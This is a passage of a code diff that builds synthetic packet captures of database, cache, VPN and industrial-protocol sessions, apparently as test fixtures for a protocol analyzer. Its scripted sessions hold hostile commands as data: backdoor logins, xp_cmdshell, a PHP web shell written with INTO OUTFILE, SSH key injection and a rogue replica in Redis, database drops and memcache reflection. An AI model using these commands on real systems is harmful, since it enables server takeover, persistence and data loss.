+            (True, b'delete session:4711\r\n'), (False, b'DELETED\r\n'), (True, b'bogus\r\n'), (False, b'ERROR\r\n'),
+            (True, b'flush_all\r\n'), (False, b'OK\r\n')]
+    value = (b'flush_all\r\nshutdown\r\n' * 150)[:3000]
+    blob = [(True, b'set blob 0 0 3000\r\n' + value + b'\r\n'), (False, b'STORED\r\n')]
+    stats_reply = b''.join(b'STAT %s %s\r\n' % (k, v) for k, v in (
+        (b'pid', b'1'), (b'uptime', b'86400'), (b'version', b'1.6.38'), (b'curr_connections', b'12'),
+        (b'curr_items', b'52310'), (b'total_items', b'913204'), (b'bytes', b'48211904'))) + b'END\r\n'
+    stats = [(True, b'stats\r\n'), (False, stats_reply)]
+    binary = [(True, _memcache_binary(0x80, 0x0b, opaque=1)), (False, _memcache_binary(0x81, 0x0b, value=b'1.6.38', opaque=1)),
+              (True, _memcache_binary(0x80, 0x01, b'bin:key', struct.pack('!II', 0, 0), b'binary value', opaque=2)),
+              (False, _memcache_binary(0x81, 0x01, opaque=2)),
+              (True, _memcache_binary(0x80, 0x00, b'nope', opaque=3)),
+              (False, _memcache_binary(0x81, 0x00, value=b'Not found', status=1, opaque=3))]
+    big = b''.join(b'STAT items:%d:number %d\r\n' % (i, i * 7) for i in range(1, 400)) + b'END\r\n'
+    parts = [big[i:i + 1400] for i in range(0, len(big), 1400)]
+    out = (tcp_segments(CLIENT, MEMCACHE_SERVER, 41600, 11211, text) + tcp_segments(CLIENT, MEMCACHE_SERVER, 41601, 11211, blob)
+           + tcp_segments(CLIENT, MEMCACHE_SERVER, 41602, 11211, stats) + tcp_segments(CLIENT, MEMCACHE_SERVER, 41603, 11211, binary))
+    udp = [(MEMCACHE_VICTIM, MEMCACHE_SERVER, 41700, 11211, _memcache_udp(0x1234, 0, 1, b'stats items\r\n'))]
+    udp += [(MEMCACHE_SERVER, MEMCACHE_VICTIM, 11211, 41700, _memcache_udp(0x1234, i, len(parts), part))
+            for i, part in enumerate(parts)]
+    udp += [(MEMCACHE_SCANNER, MEMCACHE_SERVER, 41800, 11211, _memcache_udp(0, 0, 1, b'stats items\r\n')),
+            (MEMCACHE_SCANNER, MEMCACHE_SERVER, 41801, 11211, bytes.fromhex('392e3419365d673a1a1d6d75570211')),
+            (MEMCACHE_SCANNER, MEMCACHE_SERVER, 11211, 8081, bytes.fromhex('5c2e50616a0e557f330a1f13acef'))]
+    return out + [_udp_packet(*p) for p in udp]
+
+
+def write_memcache_pcap(path):
+    write_pcap(path, memcache_packets())
+
+
+# ---------------------------------------------------------------- Microsoft SQL Server (TDS)
+#
+# Shaped on a capture of SQL Server 2022 (16.0.4305) and python-tds.
+# CLIENT:42400 logs in as sa with the wrong password (18456), encryption
+# not supported on either side. CLIENT:42401 logs in as sa (Str0ng!Passw0rd)
+# from SQLCMD on host attacker, reads the logins' password hashes, creates
+# a login (Bd00r!x9z) and makes it sysadmin, turns on xp_cmdshell and
+# runs it (refused: 15281), drops a database, runs a query through
+# sp_executesql and calls a stored procedure. CLIENT:42402 encrypts only
+# its login - the user hidden, the SQL after it not. CLIENT:42403's server
+# requires encryption: the pre-login is all there is.
+
+MSSQL_SERVER = '198.51.100.100'
+
+
+def _tds(kind, payload, packet=1):
+    return struct.pack('!BBHHBB', kind, 0x01, 8 + len(payload), 0, packet, 0) + payload
+
+
+def _tds_prelogin(kind, encryption):
+    options = [(0, bytes.fromhex('100010d10000')), (1, bytes([encryption])), (2, b'\x00'), (3, b'\x00\x00\x00\x00'),
+               (4, b'\x00')]
+    at, head, data = 5 * len(options) + 1, b'', b''
+    for token, value in options:
+        head += struct.pack('!BHH', token, at + len(data), len(value))
+        data += value
+    return _tds(kind, head + b'\xff' + data)
+
+
+def _tds_obfuscate(password):
+    return bytes((((b << 4) & 0xf0) | (b >> 4)) ^ 0xa5 for b in password.encode('utf-16-le'))
+
+
+def _tds_login7(user, password, database='master'):
+    values = [('attacker', None), (user, None), (password, 'password'), ('SQLCMD', None), ('198.51.100.100', None),
+              ('', None), ('Python TDS Library', None), ('', None), (database, None)]
+    at, offsets, data = 94, b'', b''
+    for text, kind in values:
+        raw = _tds_obfuscate(text) if kind else text.encode('utf-16-le')
+        offsets += struct.pack('<HH', at + len(data), len(text))
+        data += raw
+    offsets += b'\x00' * 6 + struct.pack('<HHHHHHI', at + len(data), 0, at + len(data), 0, at + len(data), 0, 0)
+    head = struct.pack('<IIIIII', 94 + len(data), 0x74000004, 4096, 7, 4242, 0) + bytes([0xe0, 0x03, 0, 0]) + struct.pack('<iI', 0, 0x409)
+    return _tds(0x10, head + offsets + data)
+
+
+def _tds_loginack():
+    name = 'Microsoft SQL Server'.encode('utf-16-le')
+    body = b'\x01' + struct.pack('>I', 0x74000004) + bytes([len(name) // 2]) + name + bytes([16, 0, 0x10, 0xd1])
+    return b'\xad' + struct.pack('<H', len(body)) + body
+
+
+def _tds_done(rows=0, error=False):
+    return b'\xfd' + struct.pack('<HHQ', (0x10 if rows else 0) | (0x02 if error else 0), 0xc1, rows)
+
+
+def _tds_error(number, message, severity=14):
+    text = message.encode('utf-16-le')
+    server = 'sqlsrv'.encode('utf-16-le')
+    body = struct.pack('<IBB', number, 1, severity) + struct.pack('<H', len(text) // 2) + text + bytes([len(server) // 2]) + server + b'\x00' + struct.pack('<I', 1)
+    return b'\xaa' + struct.pack('<H', len(body)) + body
+
+
+_TDS_HEADERS = struct.pack('<IIHQI', 22, 18, 2, 0, 1)
+
+
+def _tds_batch(sql):
+    return _tds(1, _TDS_HEADERS + sql.encode('utf-16-le'))
+
+
+def _tds_executesql(sql):
+    text = sql.encode('utf-16-le')
+    params = 'N\'@P1 nvarchar(4000)\''.encode('utf-16-le')
+    statement = b'\x00\x00\xe7\xff\xff\x09\x04\xd0\x00\x34' + b'\xfe' + b'\xff' * 7 + struct.pack('<I', len(text)) + text + b'\x00' * 4
+    declaration = b'\x00\x00\xe7\x40\x1f\x09\x04\xd0\x00\x34' + struct.pack('<H', len(params)) + params
+    return _tds(3, _TDS_HEADERS + b'\xff\xff\x0a\x00\x00\x00' + statement + declaration)
+
+
+def _tds_procedure(name):
+    text = name.encode('utf-16-le')
+    return _tds(3, _TDS_HEADERS + struct.pack('<H', len(text) // 2) + text + b'\x00\x00')
+
+
+def mssql_packets():
+    failed = [(True, _tds_prelogin(0x12, 2)), (False, _tds_prelogin(4, 2)), (True, _tds_login7('sa', 'WrongPassword1')),
+              (False, _tds(4, _tds_error(18456, "Login failed for user 'sa'.") + _tds_done(error=True)))]
+    session = [(True, _tds_prelogin(0x12, 2)), (False, _tds_prelogin(4, 2)), (True, _tds_login7('sa', 'Str0ng!Passw0rd')),
+               (False, _tds(4, _tds_loginack() + _tds_done()))]
+    for request, reply in ((_tds_batch('SELECT name, password_hash FROM sys.sql_logins'), _tds_done(3)),
+                           (_tds_batch("CREATE LOGIN backdoor WITH PASSWORD = 'Bd00r!x9z', CHECK_POLICY = OFF"), _tds_done()),
+                           (_tds_batch('ALTER SERVER ROLE sysadmin ADD MEMBER backdoor'), _tds_done()),
+                           (_tds_batch("EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE"), _tds_done()),
+                           (_tds_batch("EXEC xp_cmdshell 'whoami'"),
+                            _tds_error(15281, "SQL Server blocked access to procedure 'sys.xp_cmdshell'.", 16) + _tds_done(error=True)),
+                           (_tds_batch('DROP DATABASE shop'), _tds_done()),
+                           (_tds_executesql('SELECT name FROM sys.databases WHERE name = @P1'), _tds_done(1)),
+                           (_tds_procedure('dbo.p_GetOrders'), _tds_done(12))):
+        session += [(True, request), (False, _tds(4, reply))]
+    login_only = [(True, _tds_prelogin(0x12, 0)), (False, _tds_prelogin(4, 0)),
+                  (True, _tds(0x12, b'\x16\x03\x03\x00\x10' + bytes(16))), (False, _tds(4, _tds_loginack() + _tds_done())),
+                  (True, _tds_batch('SELECT 1')), (False, _tds(4, _tds_done(1)))]
+    everything = [(True, _tds_prelogin(0x12, 0)), (False, _tds_prelogin(4, 3)), (True, _tds(0x12, b'\x16\x03\x03\x00\x10' + bytes(16)))]
+    return (tcp_segments(CLIENT, MSSQL_SERVER, 42400, 1433, failed) + tcp_segments(CLIENT, MSSQL_SERVER, 42401, 1433, session)
+            + tcp_segments(CLIENT, MSSQL_SERVER, 42402, 1433, login_only) + tcp_segments(CLIENT, MSSQL_SERVER, 42403, 1433, everything))
+
+
+def write_mssql_pcap(path):
+    write_pcap(path, mssql_packets())
+
+
+# ---------------------------------------------------------------- MySQL
+#
+# Shaped on a capture of MariaDB 11.8 and the mysql client. CLIENT:42300
+# logs in as app with the wrong password (1045). CLIENT:42301 logs in as
+# app to shop and reads customers twice and mysql.user's password hashes,
+# creates a user (its password Bd00r!) and grants it everything, writes a
+# PHP web shell with INTO OUTFILE, queries a table that isn't there
+# (1146), drops the database, and sets app's password. CLIENT:42302 logs
+# in as root with no password. CLIENT:42303 asks for TLS before logging in.
+
+MYSQL_SERVER = '198.51.100.99'
+
+
+def _mysql(seq, payload):
+    return struct.pack('<I', len(payload))[:3] + bytes([seq]) + payload
+
+
+def _mysql_lenenc(data):
+    return bytes([len(data)]) + data
+
+
+def _mysql_greeting():
+    salt = b'abcdefgh'
+    return _mysql(0, b'\x0a' + b'11.8.6-MariaDB-0+deb13u1\x00' + struct.pack('<I', 31) + salt + b'\x00'
+                  + struct.pack('<HBHH', 0xf7fe, 45, 0x0002, 0x81ff) + b'\x15' + b'\x00' * 10 + b'ijklmnopqrst\x00'
+                  + b'mysql_native_password\x00')
+
+
+def _mysql_login(user, database=None, password=True, ssl=False):
+    caps = 0x001aa285 | (0x08 if database else 0) | (0x800 if ssl else 0)
+    head = struct.pack('<IIB', caps, 16777216, 45) + b'\x00' * 23
+    if ssl:
+        return _mysql(1, head)
+    attrs = b''.join(_mysql_lenenc(k.encode()) + _mysql_lenenc(v.encode()) for k, v in
+                     (('_os', 'Linux'), ('_client_name', 'libmariadb'), ('_pid', '1649'), ('_client_version', '3.4.9'),
+                      ('_platform', 'x86_64'), ('program_name', 'mysql')))
+    auth = bytes(range(1, 21)) if password else b''
+    return _mysql(1, head + user.encode() + b'\x00' + _mysql_lenenc(auth) + (database.encode() + b'\x00' if database else b'')
+                  + b'mysql_native_password\x00' + _mysql_lenenc(attrs))
+
+
+def _mysql_ok(seq, rows=0):
+    return _mysql(seq, b'\x00' + bytes([rows, 0]) + struct.pack('<HH', 0x0002, 0))
+
+
+def _mysql_err(seq, code, state, message):
+    return _mysql(seq, b'\xff' + struct.pack('<H', code) + b'#' + state.encode() + message.encode())
+
+
+def _mysql_rows(column, rows):
+    lenenc = _mysql_lenenc
+    definition = (lenenc(b'def') + lenenc(b'shop') + lenenc(b't') + lenenc(b't') + lenenc(column.encode())
+                  + lenenc(column.encode()) + b'\x0c' + struct.pack('<HIBHB', 45, 160, 253, 0, 0) + b'\x00\x00')
+    eof = lambda seq: _mysql(seq, b'\xfe\x00\x00\x02\x00')
+    out = _mysql(1, b'\x01') + _mysql(2, definition) + eof(3)
+    for i, row in enumerate(rows):
+        out += _mysql(4 + i, lenenc(row.encode()))
+    return out + eof(4 + len(rows))
+
+
+def mysql_packets():
+    query = lambda sql: _mysql(0, b'\x03' + sql.encode())
+    failed = [(False, _mysql_greeting()), (True, _mysql_login('app', password=True)),
+              (False, _mysql_err(2, 1045, '28000', "Access denied for user 'app'@'10.1.0.10' (using password: YES)"))]
+    session = [(False, _mysql_greeting()), (True, _mysql_login('app', 'shop')), (False, _mysql_ok(2))]
+    for sql, reply in (('SELECT * FROM customers', _mysql_rows('name', ['Ann', 'Bob'])),
+                       ('SELECT * FROM customers', _mysql_rows('name', ['Ann', 'Bob'])),
+                       ('SELECT user, host, password FROM mysql.user', _mysql_rows('user', ['root', 'app'])),
+                       ("CREATE USER 'backdoor'@'%' IDENTIFIED BY 'Bd00r!'", _mysql_ok(1)),
+                       ("GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION", _mysql_ok(1)),
+                       ("""SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php'""", _mysql_ok(1, 1)),
+                       ('SELECT * FROM nosuchtable', _mysql_err(1, 1146, '42S02', "Table 'shop.nosuchtable' doesn't exist")),
+                       ('DROP DATABASE shop', _mysql_ok(1, 1)),
+                       ("SET PASSWORD FOR 'app'@'%' = PASSWORD('n3wPass')", _mysql_ok(1))):
+        session += [(True, query(sql)), (False, reply)]
+    session.append((True, _mysql(0, b'\x01')))
+    root = [(False, _mysql_greeting()), (True, _mysql_login('root', password=False)), (False, _mysql_ok(2)),
+            (True, query('select @@version_comment limit 1')), (False, _mysql_rows('@@version_comment', ['Debian']))]
+    ssl = [(False, _mysql_greeting()), (True, _mysql_login('', ssl=True)), (True, b'\x16\x03\x01\x00\x05' + bytes(5))]
+    return (tcp_segments(CLIENT, MYSQL_SERVER, 42300, 3306, failed) + tcp_segments(CLIENT, MYSQL_SERVER, 42301, 3306, session)
+            + tcp_segments(CLIENT, MYSQL_SERVER, 42302, 3306, root) + tcp_segments(CLIENT, MYSQL_SERVER, 42303, 3306, ssl))
+
+
+def write_mysql_pcap(path):
+    write_pcap(path, mysql_packets())
+
+
+# ---------------------------------------------------------------- Oracle TNS
+#
+# CLIENT:41500 connects to TNS_SERVER's listener for service FIXDB and logs
+# in as sys from sqlplus on host attacker (OS user mallory), then creates
+# a user (its password S3cret!), grants it DBA, reads payroll twice, runs
+# a long query sent in chunks that fails (ORA-00942), drops a table and
+# inserts a row. CLIENT:41501 logs in as system and is refused (ORA-01017).
+# CLIENT:41502 asks for SID ORCLX, which the listener doesn't know
+# (ERR=12505), CLIENT:41503 sends the listener a version command, and
+# CLIENT:41504 is redirected to another port.
+
+TNS_SERVER = '198.51.100.96'
+TNS_LONG_QUERY = ('SELECT owner, table_name, num_rows FROM dba_tables WHERE owner NOT IN '
+                  "('SYS', 'SYSTEM', 'OUTLN', 'DBSNMP') AND num_rows > 1000 ORDER BY num_rows DESC")
+
+
+def _tns(kind, body):
+    return struct.pack('!HHBBH', 8 + len(body), 0, kind, 0, 0) + body
+
+
+def _tns_connect(descriptor):
+    data = descriptor.encode()
+    return _tns(1, struct.pack('!HHHHHHHHHHIBB', 314, 300, 0x0c41, 8192, 32767, 0x7f08, 0, 0x0100, len(data), 34,
+                               2048, 0x41, 0x41) + data)
+
+
+def _tns_data(payload):
+    return _tns(6, b'\x00\x00' + payload)
+
+
+def _tns_kv(name, value=''):
+    out = struct.pack('<I', len(name)) + bytes([len(name)]) + name.encode()
+    out += struct.pack('<I', len(value)) + bytes([len(value)]) + value.encode() if value else b'\x00' * 4
+    return out + b'\x00' * 4
+
+
+def _tns_login(function, user, pairs):
+    return _tns_data(bytes([3, function, 2, 1, 1, 0, 0, 0, 1, 1, 1, 1]) + bytes([len(user)]) + user.encode()
+                     + b''.join(_tns_kv(*pair) for pair in pairs))
+
+
+def _tns_sql_call(sql, chunked=False):
+    text = sql.encode()
+    if chunked:
+        string = b'\xfe' + b''.join(bytes([len(text[i:i + 64])]) + text[i:i + 64] for i in range(0, len(text), 64)) + b'\x00'
+    else:
+        string = bytes([len(text)]) + text
+    return _tns_data(b'\x03\x5e\x05\x61\x80\x00\x00\x00\x00\x00\x00\x01' + string + b'\x01\x00\x00\x00\x00')
+
+
+def _tns_reply(error=None):
+    return _tns_data(b'\x04\x01\x00\x00\x00\x00\x00\x00' + (error.encode() + b'\n' if error else b''))
+
+
+def _tns_session(user, final):
+    keys = [('AUTH_TERMINAL', 'pts/1'), ('AUTH_PROGRAM_NM', 'sqlplus@attacker (TNS V1-V3)'),
+            ('AUTH_MACHINE', 'attacker'), ('AUTH_PID', '4242'), ('AUTH_SID', 'mallory')]
+    return [(True, _tns_login(0x76, user, keys)),
+            (False, _tns_data(b'\x08\x02' + _tns_kv('AUTH_SESSKEY', 'AB' * 32) + _tns_kv('AUTH_VFR_DATA'))),
+            (True, _tns_login(0x73, user, [('AUTH_SESSKEY', 'CD' * 32), ('AUTH_PASSWORD', 'EF' * 32)] + keys)),
+            (False, final)]
+
+
+def tns_packets():
+    descriptor = ('(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(HOST=198.51.100.96)(PORT=1521))(CONNECT_DATA=(SERVICE_NAME=FIXDB)'
+                  '(CID=(PROGRAM=sqlplus@attacker)(HOST=attacker)(USER=mallory))))')
+    accept = _tns(2, struct.pack('!HHHHHHHBB', 314, 0x0c01, 8192, 32767, 0x0100, 0, 24, 0x41, 0x41))
+    welcome = _tns_data(b'\x08\x05' + _tns_kv('AUTH_VERSION_STRING', '- Production') + _tns_kv('AUTH_SESSION_ID', '42')
+                        + _tns_kv('AUTH_DBNAME', 'FIXDB') + _tns_kv('AUTH_INSTANCENAME', 'fixdb1')
+                        + _tns_kv('AUTH_SC_SERVER_HOST', 'dbhost'))
+    session = [(True, _tns_connect(descriptor)), (False, accept)] + _tns_session('sys', welcome)
+    for sql, chunked, error in (('create user backdoor identified by S3cret!', False, None),
+                                ('grant dba to backdoor', False, None), ('SELECT * FROM payroll', False, None),
+                                ('SELECT * FROM payroll', False, 'ORA-01403: no data found'),
+                                (TNS_LONG_QUERY, True, 'ORA-00942: table or view does not exist'),
+                                ('drop table audit_log', False, None), ('insert into payroll values (1, 99000)', False, None)):
+        session += [(True, _tns_sql_call(sql, chunked)), (False, _tns_reply(error))]
+    refused_login = [(True, _tns_connect(descriptor)), (False, accept)] + _tns_session(
+        'system', _tns_reply('ORA-01017: invalid username/password; logon denied'))
+    unknown = [(True, _tns_connect('(DESCRIPTION=(CONNECT_DATA=(SID=ORCLX)(CID=(PROGRAM=odat)(HOST=attacker)(USER=mallory)))'
+                                   '(ADDRESS=(PROTOCOL=TCP)(HOST=198.51.100.96)(PORT=1521)))')),
+               (False, _tns(4, b'\x22\x00' + struct.pack('!H', 56) + b'(DESCRIPTION=(TMP=)(VSNNUM=153092352)(ERR=12505))'))]
+    command = [(True, _tns_connect('(CONNECT_DATA=(COMMAND=version))')),
+               (False, _tns(4, b'\x22\x00' + struct.pack('!H', 62)
+                            + b'(DESCRIPTION=(TMP=)(VSNNUM=318767104)(ERR=0)(ALIAS=LISTENER))'))]
+    redirect = b'(ADDRESS=(PROTOCOL=tcp)(HOST=198.51.100.96)(PORT=40123))'
+    redirected = [(True, _tns_connect(descriptor)), (False, _tns(5, struct.pack('!H', len(redirect)) + redirect))]
+    return (tcp_segments(CLIENT, TNS_SERVER, 41500, 1521, session) + tcp_segments(CLIENT, TNS_SERVER, 41501, 1521, refused_login)
+            + tcp_segments(CLIENT, TNS_SERVER, 41502, 1521, unknown) + tcp_segments(CLIENT, TNS_SERVER, 41503, 1521, command)
+            + tcp_segments(CLIENT, TNS_SERVER, 41504, 1521, redirected))
+
+
+def write_tns_pcap(path):
+    write_pcap(path, tns_packets())
+
+
+# ---------------------------------------------------------------- OpenVPN
+#
+# A client (CLIENT:40500) opens an OpenVPN session over UDP with
+# OPENVPN_SERVER: the hard resets, a TLS 1.2 handshake inside the control
+# channel (the server's certificate is the fixtures' self-signed
+# DTLS_CERTIFICATE), then data both ways, the last under a renegotiated
+# key. Another host (OPENVPN_RETRIER:40600) sends three hard resets, with
+# new session IDs, that nothing answers.
+
+OPENVPN_SERVER, OPENVPN_RETRIER = '198.51.100.94', '10.1.0.77'
+
+
+def _openvpn_control(opcode, session, packet_id, payload=b'', acks=(), remote=b''):
+    ack = bytes([len(acks)]) + b''.join(struct.pack('!I', a) for a in acks) + (remote if acks else b'')
+    return bytes([opcode << 3]) + session + ack + struct.pack('!I', packet_id) + payload
+
+
+def openvpn_packets():
+    client, server = bytes.fromhex('1122334455667788'), bytes.fromhex('a1a2a3a4a5a6a7a8')
+    out = [
+        (CLIENT, OPENVPN_SERVER, 40500, 1194, _openvpn_control(7, client, 0)),
+        (OPENVPN_SERVER, CLIENT, 1194, 40500, _openvpn_control(8, server, 0, acks=(0,), remote=client)),
+        (CLIENT, OPENVPN_SERVER, 40500, 1194, _openvpn_control(4, client, 1, _tls12_client_hello('vpn.example'),
+                                                               acks=(0,), remote=server)),
+        (OPENVPN_SERVER, CLIENT, 1194, 40500, _openvpn_control(4, server, 1, _tls12_server_flight(), acks=(1,),
+                                                               remote=client)),
+    ]
+    data = lambda key, n: bytes([9 << 3 | key]) + b'\x00\x00\x01' + bytes(range(n))
+    out += [(CLIENT, OPENVPN_SERVER, 40500, 1194, data(0, 60)), (OPENVPN_SERVER, CLIENT, 1194, 40500, data(0, 80)),
+            (CLIENT, OPENVPN_SERVER, 40500, 1194, data(1, 60)), (OPENVPN_SERVER, CLIENT, 1194, 40500, data(1, 80))]
+    out += [(OPENVPN_RETRIER, OPENVPN_SERVER, 40600, 1194, _openvpn_control(7, bytes([i]) * 8, 0)) for i in range(1, 4)]
+    return [_udp_packet(*p) for p in out]
+
+
+def write_openvpn_pcap(path):
+    write_pcap(path, openvpn_packets())
+
+
+# ---------------------------------------------------------------- WireGuard
+#
+# CLIENT:40700 and WG_SERVER:51820 complete a handshake, send data each
+# way (a keepalive among it) and rekey - the server initiating this time.
+# WG_RETRIER:40800 sends three initiations that nothing answers. WG_MID's
+# tunnel was up before the capture started: data only, two packets each
+# way, each side to one receiver index. And WG_STRAY sends one packet that
+# merely has data's shape.
+
+WG_SERVER, WG_RETRIER, WG_MID, WG_STRAY = '198.51.100.95', '10.1.0.78', '10.1.0.79', '10.1.0.80'
+
+
+def _wg_initiation(sender):
+    return b'\x01\x00\x00\x00' + struct.pack('<I', sender) + bytes(range(32)) + b'\x11' * 48 + b'\x22' * 28 + \
+        b'\x33' * 16 + b'\x00' * 16
+
+
+def _wg_response(sender, receiver):
+    return b'\x02\x00\x00\x00' + struct.pack('<II', sender, receiver) + bytes(range(32, 64)) + b'\x44' * 16 + \
+        b'\x55' * 16 + b'\x00' * 16
+
+
+def _wg_data(receiver, counter, blocks=4):
+    return b'\x04\x00\x00\x00' + struct.pack('<IQ', receiver, counter) + b'\x66' * (16 * blocks)
+
+
+def wireguard_packets():
+    out = [(CLIENT, WG_SERVER, 40700, 51820, _wg_initiation(0x1111)),
+           (WG_SERVER, CLIENT, 51820, 40700, _wg_response(0x2222, 0x1111)),
+           (CLIENT, WG_SERVER, 40700, 51820, _wg_data(0x2222, 0)),
+           (WG_SERVER, CLIENT, 51820, 40700, _wg_data(0x1111, 0)),
+           (CLIENT, WG_SERVER, 40700, 51820, _wg_data(0x2222, 1, blocks=1)),      # a keepalive
+           (WG_SERVER, CLIENT, 51820, 40700, _wg_initiation(0x3333)),
+           (CLIENT, WG_SERVER, 40700, 51820, _wg_response(0x4444, 0x3333)),
+           (WG_SERVER, CLIENT, 51820, 40700, _wg_data(0x4444, 0))]
+    out += [(WG_RETRIER, WG_SERVER, 40800, 51820, _wg_initiation(0x5550 + i)) for i in range(3)]
+    for i in range(2):
+        out += [(WG_MID, WG_SERVER, 40900, 51820, _wg_data(0x6666, 100 + i)),
+                (WG_SERVER, WG_MID, 51820, 40900, _wg_data(0x7777, 200 + i))]
+    out.append((WG_STRAY, WG_SERVER, 41000, 44450, _wg_data(0x8888, 959158, blocks=8)))
+    return [_udp_packet(*p) for p in out]
+
+
+def write_wireguard_pcap(path):
+    write_pcap(path, wireguard_packets())
+
+
+# ---------------------------------------------------------------- PROFINET DCP
+#
+# An engineering station (PN_ENGINEERING) asks every PROFINET device to
+# identify itself, and one PLC (PN_DEVICE) answers: plc-line1, an S7-1500
+# (Siemens, vendor 0x002a), an IO controller at 192.168.0.20. The station
+# then readdresses it permanently to 10.9.9.9 (ok), and tells it to reset
+# to factory (refused - in operation). Another controller (PN_CONTROLLER)
+# looks for plc-line2 twice, unanswered.
+
+PN_ENGINEERING, PN_DEVICE, PN_CONTROLLER = '00:1b:1b:00:00:01', '00:0e:8c:00:00:02', '00:1b:1b:00:00:03'
+_PN_MULTICAST = '01:0e:cf:00:00:00'
+
+
+def _pn_block(option, suboption, data):
+    block = struct.pack('!BBH', option, suboption, len(data)) + data
+    return block + (b'\x00' if len(data) % 2 else b'')
+
+
+def _pn_dcp(src, dst, frame_id, service, kind, xid, blocks, delay=0):
+    data = b''.join(blocks)
+    dcp = struct.pack('!HBBIHH', frame_id, service, kind, xid, delay, len(data)) + data
+    frame = bytes.fromhex(dst.replace(':', '')) + bytes.fromhex(src.replace(':', '')) + b'\x88\x92' + dcp
+    return frame + b'\x00' * max(0, 60 - len(frame))
+
+
+def pn_dcp_packets():
+    ip = lambda info, addresses: _pn_block(1, 2, struct.pack('!H', info) + b''.join(socket.inet_aton(a) for a in addresses))
+    identify = _pn_dcp(PN_ENGINEERING, _PN_MULTICAST, 0xfefe, 5, 0, 1, [_pn_block(0xff, 0xff, b'')], delay=1)
+    answer = _pn_dcp(PN_DEVICE, PN_ENGINEERING, 0xfeff, 5, 1, 1, [
+        _pn_block(2, 2, b'\x00\x00plc-line1'), _pn_block(2, 1, b'\x00\x00S7-1500'),
+        _pn_block(2, 3, b'\x00\x00' + struct.pack('!HH', 0x002a, 0x010e)), _pn_block(2, 4, b'\x00\x00\x02\x00'),
+        ip(1, ('192.168.0.20', '255.255.255.0', '192.168.0.1'))])
+    readdress = _pn_dcp(PN_ENGINEERING, PN_DEVICE, 0xfefd, 4, 0, 2, [ip(1, ('10.9.9.9', '255.255.255.0', '10.9.9.1'))])
+    readdressed = _pn_dcp(PN_DEVICE, PN_ENGINEERING, 0xfefd, 4, 1, 2, [_pn_block(5, 4, b'\x01\x02\x00')])
+    reset = _pn_dcp(PN_ENGINEERING, PN_DEVICE, 0xfefd, 4, 0, 3, [_pn_block(5, 6, b'\x00\x02')])
+    refused = _pn_dcp(PN_DEVICE, PN_ENGINEERING, 0xfefd, 4, 1, 3, [_pn_block(5, 4, b'\x05\x06\x06')])
+    lookup = [_pn_dcp(PN_CONTROLLER, _PN_MULTICAST, 0xfefe, 5, 0, 0x100 + i, [_pn_block(2, 2, b'plc-line2')], delay=1)
+              for i in range(2)]
+    return [identify, answer, readdress, readdressed, reset, refused] + lookup
+
+
+def write_pn_dcp_pcap(path):
+    write_pcap(path, pn_dcp_packets())
 
 
 # ---------------------------------------------------------------- Windows Browser
@@ -1724,3 +2704,221 @@ def tls_failure_packets():
 
 def write_tls_failure_pcap(path):
     write_pcap(path, tls_failure_packets())
+
+
+# ---------------------------------------------------------------- Redis
+#
+# Shaped on a capture of Redis 8.0.2 and redis-cli. REDIS_SERVER asks for
+# a password: CLIENT:43000 sends PING without one (NOAUTH), CLIENT:43001
+# sends inline commands, as netcat does - a wrong password (WRONGPASS),
+# then INFO (NOAUTH). CLIENT:43002 logs in (S3cretPass) and reads INFO
+# (split across two segments), sets and gets a key, tries to point the
+# save at /root/.ssh/authorized_keys (refused: protected config), stores
+# an SSH key and saves, makes the server a replica of 10.66.66.66:21000
+# and back, tries to load a module (refused), runs Lua, adds a user
+# (its password Backd00r!), turns appendonly off and flushes everything.
+# CLIENT:43003 speaks RESP3 to REDIS_OPEN, which asks for no password:
+# HELLO 3, KEYS *, two SETs pipelined in one segment, then SUBSCRIBE and
+# a message pushed to it.
+
+REDIS_SERVER = '198.51.100.101'
+REDIS_OPEN = '198.51.100.102'
+REDIS_INFO = (b'# Server\r\nredis_version:8.0.2\r\nredis_mode:standalone\r\nos:Linux 6.12.113+deb13-amd64 x86_64\r\n'
+              b'tcp_port:6379\r\n\r\n# Replication\r\nrole:master\r\nconnected_slaves:0\r\n')
+
+
+def _resp(*args):
+    out = b'*%d\r\n' % len(args)
+    for arg in args:
+        arg = arg.encode() if isinstance(arg, str) else arg
+        out += b'$%d\r\n%s\r\n' % (len(arg), arg)
+    return out
+
+
+def _resp_bulk(data):
+    return b'$%d\r\n%s\r\n' % (len(data), data)
+
+
+def redis_packets():
+    ok = b'+OK\r\n'
+    noauth = b'-NOAUTH Authentication required.\r\n'
+    protected = b"-ERR CONFIG SET failed (possibly related to argument '%s') - can't set protected config\r\n"
+    info = _resp_bulk(REDIS_INFO)
+    session = [(True, _resp('AUTH', 'S3cretPass')), (False, ok),
+               (True, _resp('INFO', 'server')), (False, info[:40]), (False, info[40:])]
+    for command, reply in ((('SET', 'session:1', 'hello'), ok), (('GET', 'session:1'), _resp_bulk(b'hello')),
+                           (('CONFIG', 'SET', 'dir', '/root/.ssh'), protected % b'dir'),
+                           (('CONFIG', 'SET', 'dbfilename', 'authorized_keys'), protected % b'dbfilename'),
+                           (('SET', 'crackit', '\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7 attacker@kali\n\n'), ok),
+                           (('SAVE',), ok), (('REPLICAOF', '10.66.66.66', '21000'), ok), (('REPLICAOF', 'NO', 'ONE'), ok),
+                           (('MODULE', 'LOAD', '/tmp/exp.so'), b'-ERR MODULE command not allowed.\r\n'),
+                           (('EVAL', "return redis.call('dbsize')", '0'), b':2\r\n'),
+                           (('ACL', 'SETUSER', 'backdoor', 'on', '>Backd00r!', '~*', '+@all'), ok),
+                           (('CONFIG', 'SET', 'appendonly', 'no'), ok), (('FLUSHALL',), ok)):
+        session += [(True, _resp(*command)), (False, reply)]
+    hello = (b'%7\r\n+server\r\n+redis\r\n+version\r\n+7.2.4\r\n+proto\r\n:3\r\n+id\r\n:5\r\n+mode\r\n+standalone\r\n'
+             b'+role\r\n+master\r\n+modules\r\n*0\r\n')
+    open_session = [(True, _resp('HELLO', '3')), (False, hello),
+                    (True, _resp('KEYS', '*')), (False, b'*2\r\n$6\r\nuser:1\r\n$6\r\nuser:2\r\n'),
+                    (True, _resp('SET', 'a', '1') + _resp('SET', 'b', '2')), (False, b'+OK\r\n+OK\r\n'),
